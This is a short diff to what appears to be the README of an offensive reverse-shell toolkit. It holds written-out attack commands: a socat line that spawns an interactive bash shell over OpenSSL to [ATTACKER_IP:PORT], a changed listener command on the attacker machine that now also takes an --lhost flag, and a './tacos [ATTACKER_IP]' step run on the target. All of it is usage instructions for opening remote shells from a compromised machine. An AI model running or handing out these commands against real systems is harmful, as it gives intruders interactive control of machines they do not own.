@@ -28,7 +28,7 @@ socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP:PORT],v
 ```shell
 # On attacker machine
 tmux
-./light-pty4all/socat-listener.sh --lport [ATTACKER_PORT] #multi-handler
+./light-pty4all/socat-listener.sh --lhost [ATTACKER_IP] --lport [ATTACKER_PORT] #multi-handler
 
 # On target (transfer tacos as you wish)
 ./tacos [ATTACKER_IP]
